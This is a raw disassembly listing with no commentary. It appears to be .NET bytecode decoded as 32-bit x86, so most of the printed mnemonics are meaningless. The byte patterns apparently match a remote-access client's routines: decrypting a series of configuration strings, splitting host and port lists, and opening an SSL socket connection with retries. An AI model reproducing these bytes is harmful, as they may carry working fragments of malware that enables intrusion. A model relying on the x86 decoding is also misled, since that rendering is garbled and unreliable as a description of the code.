  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	ed                   	in     (%dx),%eax
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	a0 02 00 70 80       	mov    0x80700002,%al
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	53                   	push   %ebx
  4028f6:	03 00                	add    (%eax),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	67 03 00             	add    (%bx,%si),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	7f 03                	jg     0x40290e
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	d9 03                	flds   (%ebx)
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	8c 04 00             	mov    %es,(%eax,%eax,1)
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	e7 16                	out    %eax,$0x16
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	9a 1e 00 70 80 0c 00 	lcall  $0xc,$0x8070001e
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	4d                   	dec    %ebp
  40293c:	1f                   	pop    %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	00 20                	add    %ah,(%eax)
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	b3 20                	mov    $0x20,%bl
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	b7 20                	mov    $0x20,%bh
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	6a 21                	push   $0x21
  4029a3:	00 70 28             	add    %dh,0x28(%eax)
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 74 21 00       	add    $0x217472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	74 21                	je     0x402ac2
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 76 21    	add    %esp,0x21767216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
